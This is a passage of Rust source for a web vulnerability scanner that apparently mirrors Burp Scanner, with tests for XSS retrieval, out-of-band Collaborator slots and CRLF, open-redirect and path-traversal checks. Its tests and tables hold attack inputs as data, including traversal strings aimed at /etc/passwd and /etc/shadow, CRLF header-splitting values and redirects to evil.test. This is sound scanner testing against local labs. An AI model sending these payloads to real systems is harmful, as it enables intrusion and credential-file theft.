    if url.contains("://") || url.to_ascii_lowercase().starts_with("javascript:") || url.to_ascii_lowercase().starts_with("data:") {
        return None;
    }
    if url.starts_with('/') {
        return Some(url.to_string());
    }
    let base = base_path.split('?').next().unwrap_or("/");
    let dir = &base[..base.rfind('/').map(|i| i + 1).unwrap_or(0)];
    Some(format!("{}{url}", if dir.is_empty() { "/" } else { dir }))
}

/// A GET for `path` carrying the original request's headers (session
/// cookies, Host, User-Agent) minus the body headers.
pub(crate) fn get_request_like(req: &str, path: &str) -> String {
    let head = req.find("\r\n\r\n").map(|i| &req[..i]).unwrap_or(req);
    let mut out = format!("GET {path} HTTP/1.1\r\n");
    for line in head.split("\r\n").skip(1) {
        let name = line.split(':').next().unwrap_or("").trim();
        if name.eq_ignore_ascii_case("Content-Length") || name.eq_ignore_ascii_case("Content-Type") || name.eq_ignore_ascii_case("Transfer-Encoding") {
            continue;
        }
        out.push_str(line);
        out.push_str("\r\n");
    }
    out.push_str("\r\n");
    out
}

/// Retrieval requests for the stored XSS check (Burp pairs an injection
/// request with a later request whose response shows the stored input).
/// Only safe requests are replayed: the base request when it is a GET, the
/// same-origin target of a redirecting base response, and up to three other
/// GET items crawled on the same host. Four at most.
fn stored_retrieval_requests(shared: &Shared, entry: &HistEntry, req: &str, baseline_raw: &[u8]) -> Vec<String> {
    let parts = util::parse_http(req.as_bytes());
    let host_header = util::get_header(&parts.headers, "Host").unwrap_or_default();
    let mut out: Vec<String> = Vec::new();
    if parts.method.eq_ignore_ascii_case("GET") {
        out.push(req.to_string());
    }
    if let Some(path) = active_checks::redirect_location(baseline_raw).and_then(|l| same_origin_path(&l, entry.https, &host_header, &parts.path)) {
        out.push(get_request_like(req, &path));
    }
    let base = parts.path.split('?').next().unwrap_or("").to_string();
    let mut seen: Vec<String> = vec![base];
    {
        let items = shared.crawl_items.snapshot();
        for it in items.iter() {
            if out.len() >= 4 {
                break;
            }
            let p = it.path.split('?').next().unwrap_or("").to_string();
            if it.host == entry.host && it.port == entry.port && it.https == entry.https && it.method.eq_ignore_ascii_case("GET") && !seen.contains(&p) {
                seen.push(p);
                out.push(get_request_like(req, &it.path));
            }
        }
    }
    out.truncate(4);
    out
}

/// burp.Zwwb.Zv: reflected XSS severity by point type (a header point is
/// low, a cookie point medium, every other point high).
pub(crate) fn reflected_xss_severity(kind: &IpKind) -> &'static str {
    match kind {
        IpKind::Header => "low",
        IpKind::Cookie => "medium",
        IpKind::Query
        | IpKind::Body
        | IpKind::Json(_)
        | IpKind::Multipart { .. }
        | IpKind::PathFolder(_)
        | IpKind::PathFilename(_)
        | IpKind::EntireBody
        | IpKind::XmlParam { .. }
        | IpKind::XmlTag { .. }
        | IpKind::XmlAttr { .. }
        | IpKind::ParamName(_)
        | IpKind::Base64 { .. } => "high",
    }
}

/// Collaborator slots the scanner wants for a request: `#<point>:ext` for the
/// external-interaction probe of every insertion point, plus `#<point>:xsd`
/// and `#<point>:xi` for the out-of-band half of XML injection (burp.Zp7s ->
/// Zsrh with Ze_f / Zbiw) on the points that check applies to. The UI mints
/// one Collaborator payload per slot and passes them back as `oob`.
pub fn oob_slots(shared: &Shared, req_raw: &[u8]) -> Vec<String> {
    let config = shared.scan_config.lock().unwrap().clone();
    slots_for(req_raw, ScanSpeed::from_u8(shared.scan_speed.load(Ordering::SeqCst)), &config)
}

/// The slots at audit speed `speed`: at Fast, OS command injection runs only
/// its combined payload (burp.Zc99), so only that slot gets an id.
/// The points are the scan's own ([`audit_points`] under the same
/// configuration), so slot `#k` names the scan's point `k`; a point only
/// gets the slots of the checks that will run on it ([`checks::check_applies`]).
pub(crate) fn slots_for(req_raw: &[u8], speed: ScanSpeed, config: &crate::scan_config::ScanConfig) -> Vec<String> {
    let req = String::from_utf8_lossy(req_raw);
    let mut out = Vec::new();
    for (i, ip) in audit_points(&req, config).iter().enumerate() {
        if checks::check_applies(&checks::ExternalInteraction, ip, config) {
            out.push(format!("#{i}:ext"));
        }
        if checks::check_applies(&checks::XmlInjectionOob, ip, config) && active_checks::xml_oob_applies(&ip.kind, &ip.value) {
            out.push(format!("#{i}:xsd"));
            out.push(format!("#{i}:xi"));
        }
        // PHP code injection, Collaborator half (burp.Zxvv.ZQ).
        if checks::check_applies(&checks::PhpCodeInjection, ip, config) {
            out.push(format!("#{i}:php"));
        }
        // OS command injection (burp.Zc99): one id per nslookup payload.
        if checks::check_applies(&checks::OsCommandInjection, ip, config) {
            let first = if speed == ScanSpeed::Fast { 3 } else { 0 };
            for k in first..4 {
                out.push(format!("#{i}:cmd{k}"));
            }
        }
    }
    // Collaborator everywhere (burp.Zc7h), host-level: one id per slot.
    if config.check_enabled("active.collaborator-everywhere") {
        out.extend(checks::EVERYWHERE_SLOTS.iter().map(|s| format!("#host:ce:{s}")));
    }
    out
}

/// The Collaborator payload for insertion point `idx` and slot `kind`
/// (`ext`, `xsd`, `xi`). A legacy entry keyed by the parameter name serves
/// the `ext` slot of the first point with that name. Each entry is used once.
fn oob_slot<'a>(oob: &'a [(String, String, String)], idx: usize, name: &str, kind: &str, used: &mut Vec<usize>) -> Option<&'a (String, String, String)> {
    let slot = format!("#{idx}:{kind}");
    let pos = oob
        .iter()
        .enumerate()
        .position(|(i, (k, _, _))| !used.contains(&i) && (*k == slot || (kind == "ext" && !k.starts_with('#') && k == name)))?;
    used.push(pos);
    oob.get(pos)
}

/// A header value for a header insertion point: the URL-encoded payload the
/// probes build, decoded, with control characters kept percent-encoded so a
/// decoded CR/LF can never split the request.
fn header_value(encoded: &str) -> String {
    util::url_decode(encoded)
        .chars()
        .map(|c| if (c as u32) < 0x20 || c as u32 == 0x7f { format!("%{:02X}", c as u32) } else { c.to_string() })
        .collect()
}

/// A cookie value: the URL-encoded payload with the cookie delimiters
/// (`;` and `,`) encoded too, so the payload stays inside its own cookie.
fn cookie_value(encoded: &str) -> String {
    encoded.replace(';', "%3B").replace(',', "%2C")
}

/// The request with one cookie's value replaced; the other cookies and
/// headers are left byte-for-byte.
fn with_cookie(req: &str, name: &str, value: &str) -> String {
    let Some(head_end) = req.find("\r\n\r\n") else { return req.to_string() };
    let (head, rest) = req.split_at(head_end);
    let mut done = false;
    let lines: Vec<String> = head
        .split("\r\n")
        .enumerate()
        .map(|(i, line)| {
            if i == 0 || done {
                return line.to_string();
            }
            let Some((k, v)) = line.split_once(':') else { return line.to_string() };
            if !k.trim().eq_ignore_ascii_case("cookie") {
                return line.to_string();
            }
            let pairs: Vec<String> = v
                .split(';')
                .map(|p| {
                    let t = p.trim();
                    let n = t.split('=').next().unwrap_or("");
                    if !done && n == name {
                        done = true;
                        format!("{n}={value}")
                    } else {
                        t.to_string()
                    }
                })
                .filter(|p| !p.is_empty())
                .collect();
            format!("{k}: {}", pairs.join("; "))
        })
        .collect();
    format!("{}{rest}", lines.join("\r\n"))
}

fn with_body(req: &str, body: &str) -> String {
    let head = req.find("\r\n\r\n").map(|i| &req[..i + 4]).unwrap_or(req);
    let mut out = head.to_string();
    out.push_str(body);
    String::from_utf8_lossy(&net::replace_or_add_header(out.as_bytes(), "Content-Length", &body.len().to_string())).into_owned()
}

fn replace_param(path: &str, name: &str, new_value: &str) -> String {
    let Some(qpos) = path.find('?') else { return path.to_string() };
    let (base, query) = path.split_at(qpos);
    let query = &query[1..];
    let parts: Vec<String> = query
        .split('&')
        .map(|kv| {
            let mut it = kv.splitn(2, '=');
            let k = it.next().unwrap_or("");
            if k == name {
                format!("{}={}", k, new_value)
            } else {
                kv.to_string()
            }
        })
        .collect();
    format!("{base}?{}", parts.join("&"))
}

fn rebuild_with_path(req: &str, new_path: &str) -> String {
    // Keep the body byte-for-byte; only the request line changes.
    if let Some(i) = req.find("\r\n\r\n") {
        let (head, body) = req.split_at(i);
        let mut lines = head.split("\r\n");
        let first = lines.next().unwrap_or_default();
        let mut it = first.split_whitespace();
        let method = it.next().unwrap_or("GET");
        let _ = it.next();
        let ver = it.next().unwrap_or("HTTP/1.1");
        let rest: Vec<&str> = lines.collect();
        let mut out = format!("{method} {new_path} {ver}\r\n");
        for l in rest {
            out.push_str(l);
            out.push_str("\r\n");
        }
        out.push_str(&body[2..]);
        return out;
    }
    let mut lines = req.lines();
    let first = lines.next().unwrap_or_default();
    let mut it = first.split_whitespace();
    let method = it.next().unwrap_or("GET");
    let _ = it.next();
    let ver = it.next().unwrap_or("HTTP/1.1");
    let mut out = String::new();
    out.push_str(&format!("{method} {new_path} {ver}\r\n"));
    for line in lines {
        out.push_str(line);
        out.push_str("\r\n");
    }
    if !out.ends_with("\r\n\r\n") {
        out.push_str("\r\n");
    }
    out
}

#[cfg(test)]
mod tests {

    /// Collaborator matching lives in the engine and needs no UI: a plain
    /// external-interaction id raises one issue per interaction type and is
    /// retired after DNS and HTTP; a kind-bound id (SMTP) raises its own
    /// issue once; repeats and unknown ids raise nothing.
    #[test]
    fn oob_interactions_raise_issues_without_the_ui() {
        use crate::collaborator::{DnsInteraction, HttpInteraction, Interaction, InteractionDetail, SmtpInteraction};
        let shared = net::Shared::new();
        let base = ScanIssue { host: "127.0.0.1:1".into(), path: "/".into(), ..Default::default() };
        let smtp = ScanIssue { name: "SMTP header injection".into(), sev: "medium".into(), ..base.clone() };
        shared.oob.register("tokplain".to_string(), None, base);
        shared.oob.register("toksmtp".to_string(), Some("SMTP"), smtp);
        let it = |id, token: &str, detail| Interaction { id, at: 0, source: "127.0.0.1".into(), token: Some(token.into()), detail };
        let dns = || InteractionDetail::Dns(DnsInteraction { qname: "tokplain.oob.invalid".into(), qtype: 1, raw_query: Vec::new() });
        let http = || InteractionDetail::Http(HttpInteraction { method: "GET".into(), target: "/".into(), ..Default::default() });
        assert_eq!(match_oob_interactions(&shared, &[it(1, "tokplain", dns()), it(2, "unknown", dns())]), 1);
        assert_eq!(match_oob_interactions(&shared, &[it(1, "tokplain", dns())]), 0, "a repeat raises nothing");
        assert_eq!(match_oob_interactions(&shared, &[it(3, "toksmtp", http())]), 0, "SMTP id ignores HTTP");
        assert_eq!(match_oob_interactions(&shared, &[it(4, "tokplain", http()), it(5, "toksmtp", InteractionDetail::Smtp(SmtpInteraction::default()))]), 2);
        assert!(shared.oob.is_pending_empty(), "both ids retired");
        // OS command injection waits for a CNAME lookup (burp.Zing.ZR).
        let cmd = ScanIssue { name: "OS command injection".into(), ..ScanIssue::default() };
        shared.oob.register("tokcmd".to_string(), Some("CNAME"), cmd);
        let q = |qtype| InteractionDetail::Dns(DnsInteraction { qname: "tokcmd.oob.invalid".into(), qtype, raw_query: Vec::new() });
        // An A lookup is not command execution: Burp reports it as External
        // service interaction (burp.Zfw7) and keeps waiting for the CNAME.
        assert_eq!(match_oob_interactions(&shared, &[it(6, "tokcmd", q(1))]), 1, "an A lookup is an external interaction");
        assert_eq!(match_oob_interactions(&shared, &[it(6, "tokcmd", q(1))]), 0, "reported once");
        assert_eq!(match_oob_interactions(&shared, &[it(7, "tokcmd", q(5))]), 1);
        // The same verdict from a public Collaborator (interactsh) report,
        // whose DNS query type arrives as a label.
        let cmd = ScanIssue { name: "OS command injection".into(), ..ScanIssue::default() };
        shared.oob.register("tokpub".to_string(), Some("CNAME"), cmd);
        let report = |qt: &str| {
            let r = crate::interactsh::parse_interaction(&format!(r#"{{"protocol":"dns","unique-id":"tokpub","full-id":"tokpub","q-type":"{qt}","raw-request":"","remote-address":"192.0.2.1"}}"#)).unwrap();
            Interaction { id: 9, at: 0, source: r.remote_address.clone(), token: Some(r.unique_id.clone()), detail: crate::collaborator::remote_detail(&r).unwrap() }
        };
        assert_eq!(match_oob_interactions(&shared, &[report("A")]), 1, "External service interaction (DNS)");
        assert_eq!(match_oob_interactions(&shared, &[report("CNAME")]), 1);
        let names: Vec<String> = shared.issues.lock().unwrap().iter().map(|i| i.name.clone()).collect();
        for n in ["External service interaction (DNS)", "External service interaction (HTTP)", "SMTP header injection", "OS command injection"] {
            assert!(names.iter().any(|x| x == n), "{n} missing: {names:?}");
        }
    }
    use super::*;

    /// Live parity run against the local lab (`/tmp/parity-lab/lab.py`):
    /// `WB_LAB=127.0.0.1:8140 cargo test live_lab_scan -- --ignored`.
    /// Writes every issue to /tmp/parity-lab/webprobe-issues.txt for
    /// comparison with Burp's REST API scan of the same URLs.
    #[test]
    #[ignore]
    fn live_lab_scan() {
        let lab = std::env::var("WB_LAB").unwrap_or_else(|_| "127.0.0.1:8140".into());
        let (lh, lp) = lab.split_once(':').unwrap();
        let port: u16 = lp.parse().unwrap();
        let reqs = [
            format!("GET /redirect?url=/home HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /file?name=about.txt HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /item?id=5 HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /user?name=bob HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /dir?q=smith HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /search?q=x HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /safe?q=x HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /tmpl?name=x HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            format!("GET /ssi?name=x HTTP/1.1\r\nHost: {lab}\r\n\r\n"),
            {
                // Content-Length must match the body exactly (it was 39 for a
                // 38-byte body, which only worked when a pipelined request
                // supplied the missing byte).
                let body = "<?xml version=\"1.0\"?><a><b>1</b></a>";
                format!("POST /xml?v=1 HTTP/1.1\r\nHost: {lab}\r\nContent-Type: application/xml\r\nContent-Length: {}\r\n\r\n{body}", body.len())
            },
        ];
        let mut out = String::new();
        let only = std::env::var("WB_LAB_ONLY").ok();
        for raw in reqs {
            if only.as_deref().is_some_and(|o| !raw.contains(o)) {
                continue;
            }
            let shared = net::Shared::new();
            let parts = util::parse_http(raw.as_bytes());
            let path = parts.first.split_whitespace().nth(1).unwrap_or("/").to_string();
            let entry = HistEntry {
                id: 1, ts: 0, method: parts.first.split_whitespace().next().unwrap_or("GET").into(), host: lh.into(), port,
                https: false, path: path.clone(), status: "200".into(), resp_len: 0, req_raw: raw.clone().into_bytes().into(),
                resp_raw: None, note: None, highlight: None, audited: false, params: true, edited: false, extension: String::new(), title: String::new(),
                cookies: String::new(), listener_port: 0, ip: String::new(), diffs: 0,
            };
            start_active_scan(shared.clone(), entry, &[], &[]);
            let t0 = std::time::Instant::now();
            std::thread::sleep(std::time::Duration::from_millis(300));
            while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(300) {
                std::thread::sleep(std::time::Duration::from_millis(200));
            }
            for i in shared.issues.lock().unwrap().iter() {
                out.push_str(&format!("{path}\t{}\t{}\t{}\n", i.sev, i.confidence, i.name));
            }
            if std::env::var("WB_DEBUG").is_ok() {
                for ev in shared.events.lock().unwrap().iter() {
                    eprintln!("EVENT {path}: {ev}");
                }
            }
        }
        std::fs::write(std::env::var("WB_OUT").unwrap_or_else(|_| "/tmp/parity-lab/webprobe-issues.txt".into()), &out).unwrap();
        eprintln!("{out}");
    }

    #[test]
    #[ignore]
    fn live_send_timing() {
        let shared = net::Shared::new();
        for req in [
            "GET /rest/products/search?q=apple HTTP/1.1\r\nHost: 127.0.0.1:3001\r\nAccept: application/json\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
            "GET /rest/products/search?q=apple HTTP/1.1\r\nHost: 127.0.0.1:3001\r\n\r\n",
        ] {
            for _ in 0..2 {
                let t0 = std::time::Instant::now();
                let up = net::send_raw(&shared, "127.0.0.1", 3001, req.as_bytes());
                eprintln!("TIMING {} ms len={:?} err={:?}", t0.elapsed().as_millis(), up.resp.as_ref().map(|r| r.len()), up.error);
            }
        }
    }

    /// Juice Shop coverage parity: crawl and audit from the start URL only,
    /// exactly like Burp's "Crawl and Audit" scan task. Writes
    /// /tmp/parity-juice/webprobe-crawl-issues.txt and -crawl-items.txt.
    #[test]
    #[ignore]
    fn live_juice_crawl_scan() {
        let target = std::env::var("WB_JUICE").unwrap_or_else(|_| "127.0.0.1:3001".into());
        let shared = net::Shared::new();
        let dir = std::env::var("WB_OUT").unwrap_or_else(|_| "/tmp/parity-juice".into());
        crawl_and_audit(&shared, &[format!("http://{target}/")], false);
        let mut out = String::new();
        for i in shared.issues.lock().unwrap().iter() {
            out.push_str(&format!("{}\t{}\t{}\t{}\n", i.path, i.sev, i.confidence, i.name));
        }
        std::fs::write(format!("{dir}/webprobe-crawl-issues.txt"), &out).unwrap();
        let items: String = shared.crawl_items.snapshot().iter().map(|e| format!("{} {} {} {}\n", e.status, e.method, e.path, crate::crawl::auditable(e))).collect();
        for ev in shared.events.lock().unwrap().iter().filter(|e| e.contains("crawl") || e.contains("Crawl")) {
            eprintln!("EVENT {ev}");
        }
        std::fs::write(format!("{dir}/webprobe-crawl-items.txt"), &items).unwrap();
        eprintln!("{items}");
    }

    /// Juice Shop coverage parity: the paths Burp's REST scan audited
    /// (/tmp/parity-juice/paths.txt, one per line), each fetched, passively
    /// checked and actively scanned. Run with WB_JUICE=127.0.0.1:3001
    /// wp-queue test live_juice_scan -- --include-ignored.
    #[test]
    #[ignore]
    fn live_juice_scan() {
        let target = std::env::var("WB_JUICE").unwrap_or_else(|_| "127.0.0.1:3001".into());
        let (th, tp) = target.split_once(':').unwrap();
        let port: u16 = tp.parse().unwrap();
        let paths = std::fs::read_to_string(std::env::var("WB_PATHS").unwrap_or_else(|_| "/tmp/parity-juice/paths.txt".into())).unwrap();
        let mut out = String::new();
        for path in paths.lines().map(str::trim).filter(|l| !l.is_empty()) {
            let shared = net::Shared::new();
            let raw = format!("GET {path} HTTP/1.1\r\nHost: {target}\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
            let resp = net::send_raw(&shared, th, port, raw.as_bytes()).resp;
            let mut entry = HistEntry {
                id: 1, ts: 0, method: "GET".into(), host: th.into(), port,
                https: false, path: path.to_string(), status: "200".into(), resp_len: 0, req_raw: raw.clone().into_bytes().into(),
                resp_raw: resp.map(Into::into), note: None, highlight: None, audited: false, params: path.contains('?'), edited: false, extension: String::new(), title: String::new(),
                cookies: String::new(), listener_port: 0, ip: String::new(), diffs: 0,
            };
            entry.host = format!("{th}:{port}");
            let passive = passive_check(&entry);
            entry.host = th.into();
            add_passive_issues(&shared, passive);
            start_active_scan(shared.clone(), entry, &[], &[]);
            let t0 = std::time::Instant::now();
            std::thread::sleep(std::time::Duration::from_millis(300));
            while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(300) {
                std::thread::sleep(std::time::Duration::from_millis(200));
            }
            for i in shared.issues.lock().unwrap().iter() {
                out.push_str(&format!("{}\t{}\t{}\t{}\n", i.path, i.sev, i.confidence, i.name));
            }
            if std::env::var("WB_DEBUG").is_ok() {
                for ev in shared.events.lock().unwrap().iter() {
                    eprintln!("EVENT {path}: {ev}");
                }
            }
        }
        std::fs::write(std::env::var("WB_OUT").unwrap_or_else(|_| "/tmp/parity-juice/webprobe-issues.txt".into()), &out).unwrap();
        eprintln!("{out}");
    }

    #[test]
    fn header_injection_follows_burp_zwi() {
        // A redirect that copies the value into Location without filtering.
        let raw = |v: &str| Some(format!("HTTP/1.1 302 Found\r\nLocation: /{v}\r\nContent-Length: 0\r\n\r\n").into_bytes());
        let hit = run_header_injection_check("home", raw).expect("CRLF reaches the headers");
        assert!(hit.payload.contains("\r\n"), "raw CRLF is tried first");
        // A server that strips CR and LF: never reported.
        let safe = |v: &str| {
            let v: String = v.chars().filter(|c| *c != '\r' && *c != '\n').collect();
            Some(format!("HTTP/1.1 302 Found\r\nLocation: /{v}\r\nContent-Length: 0\r\n\r\n").into_bytes())
        };
        assert!(run_header_injection_check("home", safe).is_none());
        // Bare LF still splits a header for servers that accept it.
        let lf_only = |v: &str| {
            let v: String = v.chars().filter(|c| *c != '\r').collect();
            Some(format!("HTTP/1.1 302 Found\r\nLocation: /{v}\r\nContent-Length: 0\r\n\r\n").into_bytes())
        };
        assert!(run_header_injection_check("home", lf_only).is_some());
        // Not reflected in any header: not applicable.
        assert!(run_header_injection_check("home", |_| Some(b"HTTP/1.1 200 OK\r\n\r\nhome".to_vec())).is_none());
    }

    #[test]
    fn open_redirect_follows_burp_zuag() {
        let redirect = |loc: &str| format!("HTTP/1.1 302 Found\r\nLocation: {loc}\r\nContent-Length: 0\r\n\r\n").into_bytes();
        let ok = || b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_vec();
        // `/go?url=<value>` redirects wherever it is told.
        let hit = run_open_redirect_check("/home", ScanSpeed::Normal, |p| Some(redirect(p))).expect("open redirect");
        assert!(hit.payload.starts_with("http://a") && hit.payload.ends_with("/a?/home"), "{}", hit.payload);
        // A site that only redirects within itself (prepends its origin): the
        // domain-suffix attack (ZG) does not apply because a path follows the host.
        let local = |p: &str| Some(redirect(&format!("https://shop.test/{p}")));
        assert!(run_open_redirect_check("home", ScanSpeed::Normal, local).is_none());
        // Value reflected right after the host: `.a<r>` changes the domain (ZG).
        let host_concat = |p: &str| Some(redirect(&format!("https://shop.test{p}")));
        let hit = run_open_redirect_check("", ScanSpeed::Normal, host_concat).unwrap();
        assert!(hit.payload.starts_with(".a"));
        // Not reflected into any redirect: not applicable.
        assert!(run_open_redirect_check("x", ScanSpeed::Normal, |_| Some(ok())).is_none());
        // Meta refresh and script sinks are redirect targets too.
        let meta = b"HTTP/1.1 200 OK\r\n\r\n<meta http-equiv=\"refresh\" content=\"0; url=http://evil.test/\">".to_vec();
        assert_eq!(redirect_targets(&meta), vec!["http://evil.test".to_string()]);
        assert!(js_redirect_at("<script>window.location.href = 'X", 32));
        assert!(!js_redirect_at("<script>var a = 'X", 17));
        assert_eq!(zw9s_encode("//a1/"), "%2f%2fa1%2f");
    }

    /// Minimal percent-decoder for the test server below.
    fn pct_decode(s: &str) -> Vec<u8> {
        let b = s.as_bytes();
        let mut out = Vec::new();
        let mut i = 0;
        while i < b.len() {
            if b[i] == b'%' && i + 2 < b.len() {
                if let Ok(v) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                    out.push(v);
                    i += 3;
                    continue;
                }
            }
            out.push(b[i]);
            i += 1;
        }
        out
    }

    /// End-to-end: the real active scan, over the wire, against a server
    /// whose `file` parameter is a traversal sink. It returns passwd content
    /// only when the decoded value really resolves to /etc/passwd (so the
    /// passwdX control is clean), and the scan must report it.
    #[test]
    fn active_scan_reports_traversal_against_a_vulnerable_server() {
        use std::io::{Read, Write};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut s) = stream else { continue };
                let _ = s.set_read_timeout(Some(std::time::Duration::from_secs(2)));
                let mut buf = vec![0u8; 16384];
                let n = s.read(&mut buf).unwrap_or(0);
                let head = String::from_utf8_lossy(&buf[..n]).to_string();
                let target = head.split_whitespace().nth(1).unwrap_or("/").to_string();
                let file = target
                    .split_once("file=")
                    .map(|(_, v)| pct_decode(v.split('&').next().unwrap_or("")))
                    .unwrap_or_default();
                // A naive sink: strip a NUL suffix like old C runtimes, then
                // treat the result as a path relative to /var/www.
                let file = file.split(|b| *b == 0).next().unwrap_or(&[]).to_vec();
                let f = String::from_utf8_lossy(&file);
                let body = if f.ends_with("/etc/passwd") || f == "/etc/passwd" {
                    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/:/usr/sbin/nologin\n".to_string()
                } else {
                    "<html><body>no such page</body></html>".to_string()
                };
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = s.write_all(resp.as_bytes());
            }
        });
        let shared = net::Shared::new();
        let req = format!("GET /read?file=about.txt HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n");
        let entry = HistEntry {
            id: 1,
            ts: 0,
            method: "GET".into(),
            host: "127.0.0.1".into(),
            port,
            https: false,
            path: "/read?file=about.txt".into(),
            status: "200".into(),
            resp_len: 0,
            req_raw: req.into_bytes().into(),
            resp_raw: None,
            note: None,
            highlight: None,
            audited: false,
            params: true,
            edited: false,
            extension: "txt".into(),
            title: String::new(),
            cookies: String::new(),
            listener_port: 0,
            ip: String::new(),
            diffs: 0,
        };
        start_active_scan(shared.clone(), entry, &[], &[]);
        let t0 = std::time::Instant::now();
        while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(90) {
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        assert!(!shared.scan.is_busy(), "scan did not finish");
        let issues = shared.issues.lock().unwrap();
        let trav: Vec<_> = issues.iter().filter(|i| i.name == "File path traversal").collect();
        assert_eq!(trav.len(), 1, "issues: {:?}", issues.iter().map(|i| &i.name).collect::<Vec<_>>());
        assert!(trav[0].detail.contains("/etc/passwd"), "{}", trav[0].detail);
    }

    #[test]
    fn traversal_tables_match_burp_zscp() {
        // burp.Zscp.ZL has 27 rows; Zco6 has three filenames.
        assert_eq!(TRAVERSAL_PAYLOADS.len(), 27);
        // NORMAL, Unix, plain value: placement 0 FAST+NORMAL, placement 1
        // FAST appended, placement 2 NORMAL with NUL before the value.
        let c = traversal_candidates("abc", OS_UNIX, ScanSpeed::Normal);
        let deep = "../../../../../../../../../../../../../../../../etc/passwd";
        assert_eq!(
            c,
            vec![deep.to_string(), "/etc/passwd".into(), format!("abc{deep}"), format!("{deep}\u{0}abc")]
        );
        // THOROUGH adds the encoded/overlong variants.
        assert!(traversal_candidates("abc", OS_UNIX, ScanSpeed::Thorough).len() > c.len());
        // burp.Zp3a.Zf: empty or path-like values escalate to THOROUGH.
        assert_eq!(traversal_speed(ScanSpeed::Normal, "abc"), ScanSpeed::Normal);
        assert_eq!(traversal_speed(ScanSpeed::Normal, "img/logo.png"), ScanSpeed::Thorough);
        assert_eq!(traversal_speed(ScanSpeed::Normal, ""), ScanSpeed::Thorough);
    }

    #[test]
    fn file_markers_are_case_insensitive_and_baseline_suppressed() {
        let none = [false; 5];
        assert_eq!(file_marker_hits("root:x:0:0:root:/root:/bin/bash", OS_UNIX, &none), vec!["ROOT:"]);
        assert_eq!(file_marker_hits("[fonts]\n[extensions]", OS_WINDOWS, &none), vec!["[FONTS]", "[EXTENSIONS]"]);
        assert!(file_marker_hits("<html>404</html>", OS_UNIX, &none).is_empty());
        // A marker already in the baseline never counts (burp.Zw_c ctor).
        let sup = file_marker_baseline("Contact root: admin", OS_UNIX);
        assert!(file_marker_hits("root: admin", OS_UNIX, &sup).is_empty());
        assert_eq!(file_marker_hits("root: admin bin:x:1", OS_UNIX, &sup), vec!["BIN:"]);
    }

    #[test]
    fn traversal_control_and_encoding_follow_burp() {
        assert_eq!(traversal_control("/etc/passwd"), "/etc/passwdX");
        assert_eq!(traversal_control("c:\\windows\\win.ini"), "c:\\windows\\win.iniX");
        assert_eq!(traversal_control("nothing"), "nothingX");
        assert_eq!(encode_query_payload("\u{c0}\u{ae}x"), "%C0%AEx");
        assert_eq!(encode_query_payload("a\u{0}b"), "a%00b");
        assert_eq!(encode_query_payload("../%2e"), "../%2e");
    }

    #[test]
    fn traversal_check_requires_negative_control_and_escalates_to_shadow() {
        const PASSWD: &str = "root:x:0:0:root:/root:/bin/bash\n";
        // Vulnerable: only the real file name yields file content.
        let hit = run_traversal_check("abc", "<html>ok</html>", ScanSpeed::Normal, |p| {
            Some(if p.ends_with("/etc/passwd") { PASSWD.into() } else { "<html>ok</html>".into() })
        })
        .expect("passwd read must report");
        assert_eq!(hit.file, "/etc/passwd");
        assert_eq!(hit.markers, vec!["ROOT:"]);
        // Shadow escalation wins when it also confirms.
        let hit = run_traversal_check("abc", "", ScanSpeed::Normal, |p| {
            Some(if p.ends_with("/etc/passwd") || p.ends_with("/etc/shadow") { PASSWD.into() } else { String::new() })
        })
        .unwrap();
        assert_eq!(hit.file, "/etc/shadow");
        // Same content for passwdX: the control rejects it.
        assert!(run_traversal_check("abc", "", ScanSpeed::Normal, |_| Some(PASSWD.into())).is_none());
        // Markers already on the baseline page: never reported.
        assert!(run_traversal_check("abc", PASSWD, ScanSpeed::Normal, |p| {
            Some(if p.contains("passwdX") { String::new() } else { PASSWD.into() })
        })
        .is_none());
    }

    #[test]
    fn link_manip_detects_reflected_url_target() {
        let href = |v: &str| Some(format!("HTTP/1.1 200 OK\r\n\r\n<a href=\"{v}\">next</a>").into_bytes());
        assert!(run_link_manip_check("/x", href).is_some());
        // A Location target counts (live 52685, lab /redirect: "echoed
        // unmodified within the response header Location").
        let loc = |v: &str| Some(format!("HTTP/1.1 302 Found\r\nLocation: {v}\r\n\r\n").into_bytes());
        assert!(run_link_manip_check("/x", loc).is_some());
        // An allowlisting redirector (Juice Shop /redirect) rejects the bare
        // token, so nothing is reported; the value is never kept as a prefix.
        let allow = |v: &str| {
            Some(if v.contains("github.com") {
                format!("HTTP/1.1 302 Found\r\nLocation: {v}\r\n\r\n").into_bytes()
            } else {
                format!("HTTP/1.1 406 Not Acceptable\r\n\r\nUnrecognized target URL for redirect: {v}").into_bytes()
            })
        };
        assert!(run_link_manip_check("https://github.com/x", allow).is_none());
        let text = |v: &str| Some(format!("HTTP/1.1 200 OK\r\n\r\n<p>you said {v}</p>").into_bytes());
        assert!(run_link_manip_check("/x", text).is_none());
        assert!(run_link_manip_check("/x", |_| Some(b"HTTP/1.1 200 OK\r\n\r\nok".to_vec())).is_none());
    }

    #[test]
    fn file_path_manip_variants_match_burp_zulm() {
        let (dir, valid, invalid) = file_path_variants("img/logo.png").unwrap();
        assert_eq!(dir, "img/");
        assert_eq!(valid[0], "img/./logo.png");
        assert_eq!(valid[1], "img/././logo.png");
